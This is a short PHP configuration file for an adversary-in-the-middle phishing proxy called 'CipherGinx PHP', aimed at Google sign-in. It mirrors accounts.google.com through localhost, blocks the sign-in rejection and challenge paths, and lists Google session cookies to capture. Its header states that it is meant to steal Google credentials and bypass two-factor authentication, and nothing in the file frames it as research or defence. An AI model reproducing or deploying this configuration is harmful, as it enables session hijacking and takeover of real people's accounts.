<?php
// CipherGinx PHP - Google Login Phishing Configuration
// Specialized config for capturing Google credentials and bypassing 2FA

return [
    'hostname' => 'accounts.google.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['accounts.google.com', 'localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://accounts.google.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/signin/rejected',
        '/signin/challenge',
    ],

    'get_cookie' => [
        '__Secure-1PSID',
        '__Secure-3PSID',
        '__Secure-1PSIDTS',
        '__Secure-3PSIDTS',
        'NID',
        'HSID',
        'SSID',
    ],
];
